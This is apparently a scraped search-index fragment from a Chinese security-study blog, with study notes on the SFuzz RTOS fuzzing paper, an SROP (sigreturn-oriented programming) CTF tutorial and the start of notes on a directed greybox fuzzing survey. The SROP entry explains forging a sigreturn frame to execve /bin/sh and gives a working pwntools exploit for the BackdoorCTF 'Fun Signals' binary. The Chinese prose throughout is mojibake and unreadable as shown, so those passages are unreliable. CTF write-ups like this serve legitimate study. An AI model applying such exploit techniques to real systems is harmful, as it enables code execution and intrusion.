æ­£ç¡®å’Œç¨³å®šçš„ä»¿çœŸç¯å¢ƒ\nç°çŠ¶ï¼šè¦ä¹ˆåªåœ¨ç‰¹å®šçš„è®¾å¤‡ä¸Šå·¥ä½œï¼Œè¦ä¹ˆä¾èµ–çœŸå®çš„è®¾å¤‡ï¼Œè¦ä¹ˆæ£€æµ‹æœ‰é™çš„é”™è¯¯ç±»å‹ï¼Œè¦ä¹ˆéœ€è¦äººå·¥åˆ†æå’Œé¢†åŸŸçŸ¥è¯†ï¼Œæ€»çš„æ¥è¯´ï¼Œåœ¨RTOSä¸­ç¼ºä¹ä¸€ç§çµæ´»å’Œé€šç”¨çš„æ–¹æ³•æ¥æœ‰æ•ˆåœ°å‘ç°æ¼æ´ã€‚\næ–¹æ³•ï¼šå› ä¸ºRTOSé€šå¸¸å°†ä¸€ä¸ªåº”ç”¨åˆ’åˆ†ä¸ºè®¸å¤šåˆ†ç¦»çš„å­ä»»åŠ¡ï¼Œæ¯ä¸ªå­ä»»åŠ¡çš„æ§åˆ¶æµéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œå®ƒä»¬çš„æ•°æ®æµæˆ–è®¸ä¼šæœ‰ç±»ä¼¼çš„æ¨¡å¼ã€‚æ‰€ä»¥é¦–å…ˆå¯»æ‰¾ç›¸åŒçš„æ•°æ®æµï¼Œç„¶åå®šä½å¯¹åº”å‡½æ•°ï¼Œç„¶ååˆ‡ç‰‡ä»£ç ï¼Œå¯¹å¾—åˆ°çš„åˆ‡ç‰‡ä»£ç è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚â€œè¿™äº›åˆ‡ç‰‡è¶³å¤Ÿå°ï¼Œå¯ä»¥ä½¿ç”¨ç°æœ‰çš„æ¨¡ç³Šé€»è¾‘è¿›è¡Œæµ‹è¯•ã€‚æ­¤å¤–ï¼Œå®ƒä»¬æå‡ºäº†æ›´å°ä½†æ›´å…³é”®çš„æ§åˆ¶æµèŒƒå›´ã€‚å®ƒå¯ä»¥å¤§å¤§ç¼“è§£ä»¿çœŸéš¾åº¦å’Œåˆ†æå¤æ‚æ€§ï¼Œè¿™å°†ä½¿æˆ‘ä»¬èƒ½å¤Ÿè¿›è¡Œæ›´æœ‰æ•ˆå’Œé«˜æ•ˆçš„æµ‹è¯•ï¼Œå¦‚ç°ç›’æ¨¡ç³Šå’Œç¬¦å·æ‰§è¡Œã€‚â€\nSFuzzï¼šå››ä¸ªä¸»è¦éƒ¨åˆ†\næ­£å‘åˆ‡ç‰‡æœºï¼šå®šä¹‰å¯å‘å¼æ–¹æ³•æ¥å®šä½å‡½æ•°ï¼Œç„¶åæ„é€ è°ƒç”¨å›¾ï¼Œåœ¨è°ƒç”¨å›¾ä¸­è¿›è¡Œå‰å‘åˆ‡ç‰‡ã€‚ æ§åˆ¶æµèŠ‚ç‚¹å¤„ç†ç¨‹åºï¼šä½¿ç”¨æ§åˆ¶æµèŠ‚ç‚¹å¤„ç†ç¨‹åºæ¥ç»™æ¨¡ç³Šå™¨è¡¥å……è¿è¡ŒçŠ¶æ€å’Œè¿è¡Œä¸Šä¸‹æ–‡ï¼ŒæŒ‡å¯¼æ¨¡ç³Šå™¨ç¡®å®šå¦‚ä½•å¤„ç†ä¸ç”¨æˆ·è¾“å…¥æ— å…³çš„å‡½æ•°è°ƒç”¨å’Œæ¡ä»¶åˆ†æ”¯ï¼Œè¿™å¯ä»¥å¸®åŠ©æ¨¡ç³Šå¼•æ“æé«˜è·¯å¾„æ¢ç´¢çš„æ•ˆç‡å’Œç¨³å®šæ€§ã€‚ å¾®è§‚æ¨¡ç³Šå¤„ç†ï¼šæˆ‘ä»¬çš„æ¨¡ç³Šå¼•æ“ä¸“æ³¨äºä¿®å‰ªåçš„æ‰§è¡Œæ ‘ä¸­çš„æŒ‡ä»¤ã€‚ä»è¾“å…¥æºå¼€å§‹ï¼Œå®ƒé€šè¿‡æŒ‡ä»¤çº§ä»¿çœŸæ›´æ–°æ‰§è¡Œç¯å¢ƒã€‚è¯¥å¼•æ“å°†æ‰§è¡Œä¸è¾“å…¥ç›¸å…³çš„ä»£ç ç‰‡æ®µï¼Œå¹¶å¿½ç•¥å¤§é‡ä¸å¿…è¦çš„è·¯å¾„ï¼ŒåŒ…æ‹¬å…¶ä»–è¾“å…¥å¤„ç†ç¨‹åºã€‚ä¸ºäº†æ£€æŸ¥å±é™©çš„è¡Œä¸ºï¼Œå®ƒç›‘æµ‹æ±‡åˆç‚¹å‡½æ•°è°ƒç”¨çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶åœ¨ä¸Šä¸‹æ–‡è¿åé¢„å®šçš„å®‰å…¨ç­–ç•¥æ—¶æŠ¥å‘Šæ½œåœ¨çš„é”™è¯¯ã€‚ ç¬¦å·æ‰§è¡Œåˆ†æï¼šå¯¹å‡½æ•°è¿›è¡Œåå‘åˆ‡ç‰‡ï¼Œç„¶åä»åˆ‡ç‰‡æœ«å°¾è¿›è¡Œç¬¦å·æ‰§è¡Œï¼Œç›®çš„æ˜¯è¡¥å……ä¸Šé¢ä¿®å»ºè€Œé—å¤±çš„ä¿¡æ¯ï¼Œæœ€åå®ç°ä¸€ä¸ªå®Œæ•´è€Œå‡†ç¡®çš„è·¯å¾„æ¡ä»¶æ¥è¯„ä¼°ä¸€ä¸ªæ¼æ´ï¼Œä»è€Œè¿‡æ»¤ç”±äºæ¢ç´¢ä¿®å‰ªå’Œä¸Šä¸‹æ–‡ç¼ºå¤±é€ æˆçš„å‡é˜³æ€§ç»“æœã€‚ PROBLEM AND APPROACH OVERVIEW RTOS and Embedded Devices å…·æœ‰æ‰€æœ‰åŠŸèƒ½çš„å•äºŒè¿›åˆ¶ å‰¥ç¦»äº†ç¬¦å·ç³»ç»Ÿä»¥å‡å°æ–‡ä»¶å¤§å° Motivation Example ä¸¾äº†ä¸ªä¾‹å­è¯´æ˜RTOSéš¾åˆ†æ\nNecessity and Reasonability of SFuzz åˆ‡ç‰‡æ“ä½œçš„ä¼˜åŠ¿ï¼šå¯ä»¥å¿½ç•¥æ¨¡æ‹Ÿå„ç§ç¡¬ä»¶å’ŒæœåŠ¡åŠŸèƒ½çš„å›°éš¾ï¼Œç¼“è§£ç¬¦å·æ‰§è¡Œçš„ç¼“è§£è·¯å¾„çˆ†ç‚¸é—®é¢˜ ä½¿ç”¨å®ä¾‹éªŒè¯åˆ‡ç‰‡æ“ä½œçš„æ­£ç¡®æ€§ Challenges of Slice-based Fuzzing å¦‚ä½•ç¡®å®šç‰‡æ®µçš„èŒƒå›´ï¼Ÿ å¦‚ä½•å¤„ç†ç‰‡æ®µä¸­ä¸æ§åˆ¶æµæœ‰å…³çš„ç‚¹ï¼Ÿ å¦‚ä½•æœ‰æ•ˆåœ°è¿›è¡ŒåŸºäºåˆ‡ç‰‡çš„æ¨¡ç³Šå¤„ç†å’ŒéªŒè¯PoCï¼Ÿ DESIGN å‰å‘åˆ‡ç‰‡æœºå°†è°ƒç”¨å›¾åˆ†æä¸å‰å‘æ±¡ç‚¹åˆ†æç›¸ç»“åˆï¼Œä»¥ç¡®å®šåŸºäºåˆ‡ç‰‡çš„æ¨¡ç³Šå¤„ç†çš„æ¯ä¸ªä»»åŠ¡çš„æ¢ç´¢ç©ºé—´ï¼›æ§åˆ¶æµèŠ‚ç‚¹å¤„ç†ç¨‹åºç”¨äºå¸®åŠ©åç»­çš„æ¨¡ç³Šå¤„ç†éƒ¨åˆ†è·³è¿‡ä¸å¿…è¦çš„è·¯å¾„æ¢ç´¢ï¼Œè¿™äº›èŠ‚ç‚¹ä¼šä½¿æ¨¡ç³Šå¤„ç†é˜¶æ®µå¡ä½ï¼›å¾®æ¨¡ç³Šå¼•æ“æ˜¯ä¸€ä¸ªæ··åˆç°ç›’æ¨¡ç³Šå™¨ï¼Œå®ƒç»“åˆäº†ä¸€äº›ä½çº§æŠ€æœ¯ï¼Œå¦‚é”™è¯¯æ£€æµ‹ç­–ç•¥ï¼Œä½¿æ¨¡ç³Šå™¨èƒ½å¤Ÿé¡ºåˆ©è¿è¡Œå¹¶å‘ç°é”™è¯¯,Concolicåˆ†æå™¨ä¸»è¦æ˜¯ä¸ºäº†å¸®åŠ©æˆ‘ä»¬è¿‡æ»¤ç”±äºæ¢ç´¢ä¿®å‰ªå’Œä¸Šä¸‹æ–‡ç¼ºå¤±é€ æˆçš„å‡é˜³æ€§ç»“æœã€‚\nForward Slicer æ­¥éª¤æ¦‚è¿°ï¼šé¦–å…ˆæ¢å¤å›ºä»¶ä¸­å…³é”®åŠŸèƒ½çš„è¯­ä¹‰ï¼Œä»¥å®šä½å¤–éƒ¨æ•°æ®å…¥å£ç‚¹ï¼Œç„¶ååˆ©ç”¨å‰å‘åˆ‡ç‰‡æ¨¡å—è¾“å‡ºä¸å¤„ç†å¤–éƒ¨è¾“å…¥å’Œå…¨å±€æ•°æ®æœ‰å…³çš„æ‰§è¡Œæ ‘ã€‚\nä¸‰éƒ¨åˆ†ï¼š\næ•æ„Ÿè°ƒç”¨å›¾æ„é€ å™¨ ç›®çš„ï¼šæ£€æµ‹è¾“å…¥è·å–å‡½æ•°å’Œå…¨å±€æ•°æ®è¯»å–ç‚¹ï¼Œä½œä¸ºæ ¹èŠ‚ç‚¹ æ–¹æ³•ï¼šæ²¡è¯´ è°ƒç”¨å›¾ä¿®å‰ª ç›®çš„ï¼šè¿›ä¸€æ­¥ä¿®å‰ªç‹¬ç«‹äºå¤–éƒ¨è¾“å…¥çš„å­å›¾æˆ–è·¯å¾„ æ–¹æ³•ï¼šåˆ©ç”¨è½»é‡çº§(ç²—ç²’åº¦)æ±¡æŸ“åˆ†ææŠ€æœ¯æ¥è·Ÿè¸ªè°ƒç”¨å›¾ä¸­çš„æ¯ä¸ªè·¯å¾„ï¼Œç¡®å®šå¤–éƒ¨è¾“å…¥å’Œå…¨å±€æ•°æ®çš„å½±å“èŒƒå›´ï¼ŒèŒƒå›´å¤–çš„è·¯å¾„è¢«ä¿®å‰ª è°ƒç”¨å›¾å½¢æ‹¼æ¥ï¼š ç›®çš„ï¼šåœ¨ä¸åŒè°ƒç”¨å›¾çš„èŠ‚ç‚¹ä¹‹é—´æ‹¼æ¥ä¸€äº›è¾¹ æ–¹æ³•ï¼šé™æ€åŠ¨æ€åˆ†ææ¥è¯†åˆ«ç›¸å…³èŠ‚ç‚¹ï¼Œè¿˜æœ‰åŸºäºå¸¸é‡å­—ç¬¦ä¸²è¿›è¡Œæœç´¢å’ŒåŒ¹é…ç›¸å…³èŠ‚ç‚¹æ¥æ‹¼æ¥ã€‚ Control Flow Nodes Handler æ§åˆ¶æµèŠ‚ç‚¹å¤„ç†ç¨‹åºå¯ä»¥åŸºäºè°ƒç”¨å›¾æ„å»ºç›®æ ‡ä»£ç æ®µçš„æ‰§è¡Œæ ‘ã€‚ä½†æ˜¯ä¸ºäº†ä½¿æ‰§è¡Œæ ‘ä¸Šçš„æ¨¡ç³Šæµ‹è¯•å·¥ä½œé¡ºåˆ©è¿›è¡Œï¼Œé¿å…ä¸å¿…è¦çš„è·¯å¾„æ¢ç´¢ï¼Œéœ€è¦å¤„ç†ä¸æ§åˆ¶æµç›¸å…³çš„å‡ ç§æŒ‡ä»¤ï¼Œæ¢å¥è¯è¯´éœ€è¦ç­–ç•¥æ¥æŒ‡å¯¼æ¨¡ç³Šå™¨ç¡®å®šå¦‚ä½•å¤„ç†ä»£ç ç‰‡æ®µä¸­çš„å‡½æ•°è°ƒç”¨ï¼Œå¹¶é€‰æ‹©è¦è·³è½¬çš„æ¡ä»¶è¯­å¥çš„å“ªä¸ªåˆ†æ”¯ã€‚\nMicro Fuzzing ä½œä¸ºæ¨¡ç³Šå¼•æ“çš„æ ¸å¿ƒï¼Œæˆ‘ä»¬å°†åŸºäºåˆ‡ç‰‡çš„æ¨¡ç³ŠæŠ€æœ¯ç§°ä¸ºå¾®æ¨¡ç³Šã€‚å®ƒæ¥å—ä»£ç ç‰‡æ®µä½œä¸ºè¾“å…¥ï¼Œæ¢ç´¢æ‰§è¡Œæ ‘ä¸­çš„è·¯å¾„ï¼Œå¹¶å¿½ç•¥ä¸ç›¸å…³çš„è°ƒç”¨ç«™ç‚¹å’Œå…¶ä»–è¾“å…¥æ•°æ®å¤„ç†ç¨‹åºã€‚å¼•æ“åŒæ—¶æ£€æŸ¥æ¥æ”¶å™¨å‡½æ•°è°ƒç”¨ç«™ç‚¹çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶åœ¨æ ¹æ®é¢„å®šä¹‰çš„ç­–ç•¥è¿›è¡Œå†…å­˜è®¿é—®æ—¶å¯¼å‡ºå´©æºƒè¾“å…¥ã€‚\né•œåƒåŠ è½½å™¨ï¼šå¯¹åˆ‡ç‰‡ä»£ç è¿›è¡Œé¢„å¤„ç†ï¼Œæ’å…¥è·³è½¬å’Œç»“æŸæŒ‡ä»¤ï¼Œç”¨äºå¿½ç•¥ä¸ç›¸å…³çš„è°ƒç”¨ç«™ç‚¹å’Œå…¶ä»–è¾“å…¥æ•°æ®å¤„ç†ç¨‹åºã€‚ fuzzå¼•æ“ï¼šåŸºäºUnicornAFLï¼Œå½“è°ƒç”¨æ ¸å¿ƒå¼•æ“æ—¶ï¼Œå®ƒåŠ è½½RTOSç³»ç»Ÿï¼Œå¹¶ä»å®ƒçš„å¼€å§‹(æ‰§è¡Œæ ‘çš„æ ¹èŠ‚ç‚¹)é‡å¤æ‰§è¡Œç›®æ ‡ä»£ç ç‰‡æ®µã€‚è¯¥å¼•æ“å°†åœ¨è¾“å…¥å…¥å£ç‚¹ç”Ÿæˆéšæœºæ•°æ®ã€‚å½“æ ¸å¿ƒæ¨¡ç³Šå¼•æ“å¡ä½æ—¶ï¼Œåˆ©ç”¨ç¬¦å·æ‰§è¡Œç»„ä»¶æ¥å¼•å¯¼æ¨¡ç³Šå™¨æ²¿ç€æœªæ¢ç´¢çš„è·¯å¾„æµ‹è¯•ã€‚ å†…å­˜å®‰å…¨ç­–ç•¥ã€‚è¿™å—æ²¡æ‡‚ Concolic Analyzer ç›®çš„æ˜¯æ£€æµ‹ä¸Šé¢æ¨¡ç³Šæµ‹è¯•å¾—åˆ°æ¼æ´æ˜¯ä¸æ˜¯çœŸçš„æ¼æ´ï¼Œå› ä¸ºä¿®å‰ªæ“ä½œå¯èƒ½ä¼šäº§ç”Ÿå‡é˜³æ€§æ¼æ´ã€‚\nç–‘é—® ä¿®å»ºæ‰§è¡Œè·¯å¾„ä¼šä¸ä¼šå¯¼è‡´è¦†ç›–ç‡çš„é™ä½ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/sfuzz-slice-based-fuzzing-for-real-time-operating-systems/","summary":"åŸºäºSFuzzåˆ‡ç‰‡çš„å®æ—¶æ“ä½œç³»ç»Ÿæ¨¡ç³Š Abstract èƒŒæ™¯ï¼šåµŒå…¥å¼ç³»ç»Ÿå¤§å¤šæ˜¯å®æ—¶æ“ä½œç³»ç»Ÿã€‚ é—®é¢˜ï¼šRTOSçš„å•ä½“è®¾è®¡å°†å„ç§ä»»åŠ¡å’ŒæœåŠ¡ç»“åˆæˆä¸€ä¸ªå•ä¸€çš„äºŒè¿›åˆ¶æ–‡ä»¶","title":"SFuzz Slice-based Fuzzing for Real-Time Operating Systems"},{"content":"SROP srop çš„å…¨ç§°æ˜¯ Sigreturn Oriented Programmingã€‚æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸‹ Linux çš„ä¿¡å·æœºåˆ¶\nsignal æœºåˆ¶ å¦‚å›¾æ‰€ç¤ºï¼Œå½“æœ‰ä¸­æ–­æˆ–å¼‚å¸¸äº§ç”Ÿæ—¶ï¼Œå†…æ ¸ä¼šå‘æŸä¸ªè¿›ç¨‹å‘é€ä¸€ä¸ª signalï¼Œè¯¥è¿›ç¨‹è¢«æŒ‚èµ·å¹¶è¿›å…¥å†…æ ¸ï¼ˆ1ï¼‰ï¼Œç„¶åå†…æ ¸ä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åè·³è½¬åˆ°ä¹‹å‰æ³¨å†Œå¥½çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalï¼ˆ2ï¼‰ï¼Œå½“ signal handler è¿”å›åï¼ˆ3ï¼‰ï¼Œå†…æ ¸ä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œæœ€ç»ˆæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œï¼ˆ4ï¼‰ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œå½“æœ‰ä¸­æ–­æˆ–å¼‚å¸¸äº§ç”Ÿæ—¶ï¼Œå†…æ ¸ä¼šå‘æŸä¸ªè¿›ç¨‹å‘é€ä¸€ä¸ª signalï¼Œè¯¥è¿›ç¨‹è¢«æŒ‚èµ·å¹¶è¿›å…¥å†…æ ¸ï¼ˆ1ï¼‰ï¼Œç„¶åå†…æ ¸ä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åè·³è½¬åˆ°ä¹‹å‰æ³¨å†Œå¥½çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalï¼ˆ2ï¼‰ï¼Œå½“ signal handler è¿”å›åï¼ˆ3ï¼‰ï¼Œå†…æ ¸ä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œæœ€ç»ˆæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œï¼ˆ4ï¼‰ã€‚\nä¸€ä¸ª signal frame è¢«æ·»åŠ åˆ°æ ˆï¼Œè¿™ä¸ª frame ä¸­åŒ…å«äº†å½“å‰å¯„å­˜å™¨çš„å€¼å’Œä¸€äº› signal ä¿¡æ¯ã€‚ ä¸€ä¸ªæ–°çš„è¿”å›åœ°å€è¢«æ·»åŠ åˆ°æ ˆé¡¶ï¼Œè¿™ä¸ªè¿”å›åœ°å€æŒ‡å‘ sigreturn ç³»ç»Ÿè°ƒç”¨ã€‚ signal handler è¢«è°ƒç”¨ï¼Œsignal handler çš„è¡Œä¸ºå–å†³äºæ”¶åˆ°ä»€ä¹ˆ signalã€‚ signal handler æ‰§è¡Œå®Œä¹‹åï¼Œå¦‚æœç¨‹åºæ²¡æœ‰ç»ˆæ­¢ï¼Œåˆ™è¿”å›åœ°å€ç”¨äºæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨ã€‚ sigreturn åˆ©ç”¨ signal frame æ¢å¤æ‰€æœ‰å¯„å­˜å™¨ä»¥å›åˆ°ä¹‹å‰çš„çŠ¶æ€ã€‚ æœ€åï¼Œç¨‹åºæ‰§è¡Œç»§ç»­ã€‚ 64 ä½çš„ signal frame å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œsignal frame ç”± ucontext_t ç»“æ„ä½“å®ç°ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 // defined in /usr/include/sys/ucontext.h /* Userlevel context. */ typedef struct ucontext_t { unsigned long int uc_flags; struct ucontext_t *uc_link; stack_t uc_stack; // the stack used by this context mcontext_t uc_mcontext; // the saved context sigset_t uc_sigmask; struct _libc_fpstate __fpregs_mem; } ucontext_t; // defined in /usr/include/bits/types/stack_t.h /* Structure describing a signal stack. */ typedef struct { void *ss_sp; size_t ss_size; int ss_flags; } stack_t; // difined in /usr/include/bits/sigcontext.h struct sigcontext { __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union { struct _fpstate * fpstate; __uint64_t __fpstate_word; }; __uint64_t __reserved1 [8]; }; åœ¨æ ˆä¸­çš„åˆ†å¸ƒå¦‚ä¸‹ SROP åˆ©ç”¨åŸç† åœ¨æ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ï¼Œä¸ä¼šå¯¹ signal åšæ£€æŸ¥ï¼Œå®ƒä¸çŸ¥é“å½“å‰çš„è¿™ä¸ª frame æ˜¯ä¸æ˜¯ä¹‹å‰ä¿å­˜çš„é‚£ä¸ª frameã€‚ç”±äº sigreturn ä¼šä»ç”¨æˆ·æ ˆä¸Šæ¢å¤æ¢å¤æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼Œè€Œç”¨æˆ·æ ˆæ˜¯ä¿å­˜åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­çš„ï¼Œæ˜¯ç”¨æˆ·è¿›ç¨‹å¯è¯»å†™çš„ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶äº†æ ˆï¼Œä¹Ÿå°±æ§åˆ¶äº†æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼Œè€Œè¿™ä¸€åˆ‡åªéœ€è¦ä¸€ä¸ª gadgetï¼šsyscall; ret;ã€‚ é€šè¿‡è®¾ç½® eax/rax å¯„å­˜å™¨ï¼Œå¯ä»¥åˆ©ç”¨ syscall æŒ‡ä»¤æ‰§è¡Œä»»æ„çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å°† sigreturn å’Œå…¶ä»–çš„ç³»ç»Ÿè°ƒç”¨ä¸²èµ·æ¥ï¼Œå½¢æˆä¸€ä¸ªé“¾ï¼Œä»è€Œè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¼ªé€  frame çš„ä¾‹å­ï¼š rax=59 æ˜¯ execve çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå‚æ•° rdi è®¾ç½®ä¸ºå­—ç¬¦ä¸²â€œ/bin/shâ€çš„åœ°å€ï¼Œrip æŒ‡å‘ç³»ç»Ÿè°ƒç”¨ syscallï¼Œæœ€åï¼Œå°† rt_sigreturn è®¾ç½®ä¸º sigreturn ç³»ç»Ÿè°ƒç”¨çš„åœ°å€ã€‚å½“ sigreturn è¿”å›åï¼Œå°±ä¼šä»è¿™ä¸ªä¼ªé€ çš„ frame ä¸­æ¢å¤å¯„å­˜å™¨ï¼Œä»è€Œæ‹¿åˆ° shellã€‚ å¯¹äºè¿™ä¸ªå¯„å­˜å™¨çš„é€‰æ‹©ï¼Œå› ä¸ºç³»ç»Ÿè°ƒç”¨å·å¿…é¡»å­˜å…¥ rax ä¸­ï¼Œå…¶ä»–çš„å¯„å­˜å™¨é€‰æ‹©å°±éœ€è¦æŒ‰ç…§ Linux ä¸‹çš„å‡½æ•°è°ƒç”¨çº¦å®šæ¥è¿›è¡Œã€‚\npwnlib. rop. srop åœ¨ pwntools ä¸­å·²ç»é›†æˆäº† SROP çš„åˆ©ç”¨å·¥å…·ï¼Œå³ pwnlib.rop.sropï¼Œç›´æ¥ä½¿ç”¨ç±» SigreturnFrameï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é’ˆå¯¹ä¸åŒçš„æ¶æ„ SigreturnFrame æ„é€ äº†ä¸åŒçš„ uncontext_t BackdoorCTF 2017 Fun Signals æŸ¥çœ‹æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ª 64 ä½çš„ç¨‹åºï¼Œå¹¶ä¸”æ²¡æœ‰å¼€ä»»ä½•é˜²æŠ¤æªæ–½ æ‹–å…¥ IDA ä¸­æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°ç¨‹åºä¸­è¿›è¡Œäº†ä¸¤æ¬¡ syscallï¼Œç¬¬ä¸€æ¬¡ rax çš„å€¼æ˜¯ 0ï¼Œè°ƒç”¨ read å‡½æ•°ï¼Œç¬¬äºŒæ¬¡ rax å€¼æ˜¯ 15ï¼Œæ‰§è¡Œåœæ­¢ç¨‹åºã€‚åŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ° flag çš„ä½ç½®ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦åˆ©ç”¨ SROP å°†è¯¥ä½ç½®çš„ flag è¾“å‡ºã€‚ å¦‚ä½•åˆ©ç”¨ å†çœ‹è¿™ä¸¤ä¸ª syscallï¼š\nç¬¬ä¸€ä¸ª syscall æ˜¯ read å‡½æ•°ï¼Œæ­¤æ—¶çš„ edi æ˜¯ 0ï¼Œedx æ˜¯ 0 x 400ï¼Œrsi æ˜¯æ ˆé¡¶çš„å€¼ï¼Œæ ¹æ® read å‡½æ•°çš„å‚æ•°å’Œ Linux å‡½æ•°è°ƒç”¨çº¦å®šå¯ä»¥çŸ¥é“ï¼Œè¿™æ„æ€æ˜¯ä»æ ‡å‡†è¾“å…¥è¯»å–0x400ä¸ªå­—èŠ‚åˆ°æ ˆé¡¶ã€‚ ç¬¬äºŒä¸ª syscall æ˜¯ sigreturnï¼Œå®ƒä¼šå°†æ ˆä¸­çš„æ•°æ®æŒ‰ç…§ ucontext_t ç»“æ„æ¢å¤å¯„å­˜å™¨ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™å…¥ä¸€ä¸ªä¼ªé€ çš„ sigreturn frameï¼Œè®© sigreturn æ¢å¤ã€‚ ä¸ºäº†èƒ½å¤Ÿè¾“å‡º flagï¼Œé‚£æˆ‘ä»¬ä¼ªé€ çš„ sigreturn frame å¾—æ˜¯ä¸€ä¸ª write å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿè°ƒç”¨å·æ˜¯0x1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from pwn import * elf = ELF(\u0026#39;./funsignals_player_bin\u0026#39;) io = process(\u0026#39;./funsignals_player_bin\u0026#39;) # io = remote(\u0026#39;hack.bckdr.in\u0026#39;, 9034) context.clear() context.arch = \u0026#34;amd64\u0026#34; # Creating a custom frame frame = SigreturnFrame() frame.rax = constants.SYS_write frame.rdi = constants.STDOUT_FILENO frame.rsi = elf.symbols[\u0026#39;flag\u0026#39;] frame.rdx = 50 frame.rip = elf.symbols[\u0026#39;syscall\u0026#39;] io.send(bytes(frame)) io.interactive() æˆåŠŸå°† flag è¾“å‡ºã€‚ ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/srop/","summary":"SROP srop çš„å…¨ç§°æ˜¯ Sigreturn Oriented Programmingã€‚æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸‹ Linux çš„ä¿¡å·æœºåˆ¶ signal æœºåˆ¶ å¦‚å›¾æ‰€ç¤ºï¼Œå½“æœ‰ä¸­æ–­æˆ–å¼‚å¸¸äº§ç”Ÿæ—¶ï¼Œå†…æ ¸ä¼šå‘æŸä¸ªè¿›ç¨‹å‘é€ä¸€ä¸ª s","title":"SROP"},{"content":"å®šå‘ç°ç›’æ¨¡ç³ŠæŠ€æœ¯çš„è¿›å±•ã€æŒ‘æˆ˜ä¸å±•æœ› ä½œè€…ï¼šç‹é¹é£ å•ä½ï¼šå›½é˜²ç§‘æŠ€å¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #arxiv å…³é”®å­—ï¼š #å®šå‘fuzzing #ç»¼è¿° æ€»ç»“ç¬”è®°ï¼š[[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing æ€»ç»“ç¬”è®°]] [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing.pdf]]\nPUT program under test DSE directed symbolic execution å®šå‘ç¬¦å·æ‰§è¡Œ Abstract å®šå‘ç°ç›’ç›¸å¯¹äºæ™®é€šç°ç›’æµ‹è¯•æ›´é«˜æ•ˆ å®šå‘ç°ç›’é€‚ç”¨äºè¡¥ä¸æµ‹è¯•ï¼Œbugå†ç°ï¼Œç‰¹æ®Šbugæ£€æµ‹ç­‰åœºæ™¯ æœ¬æ–‡ä»æ›´å¹¿æ³›çš„è§’åº¦ç ”ç©¶DGFï¼Œå®ƒä¸ä»…è€ƒè™‘äº†é’ˆå¯¹ç‰¹å®šä»£ç éƒ¨åˆ†çš„ä½ç½®å¯¼å‘ç±»å‹ï¼Œè€Œä¸”è¿˜è€ƒè™‘äº†æ—¨åœ¨æš´éœ²å¼‚å¸¸ç¨‹åºè¡Œä¸ºçš„è¡Œä¸ºå¯¼å‘ç±»å‹ã€‚é€šè¿‡åˆ†æDGFç ”ç©¶çš„å¥½å¤„å’Œå±€é™æ€§ï¼Œæˆ‘ä»¬è¯•å›¾æ‰¾å‡ºå½“å‰ç ”ç©¶ä¸­çš„å·®è·ï¼ŒåŒæ—¶ï¼Œæ­ç¤ºæ–°çš„ç ”ç©¶æœºä¼šï¼Œå¹¶æå‡ºè¿›ä¸€æ­¥è°ƒæŸ¥çš„é¢†åŸŸã€‚ Introuction Greybox fuzzing is widely used to test application software and libraries [5, 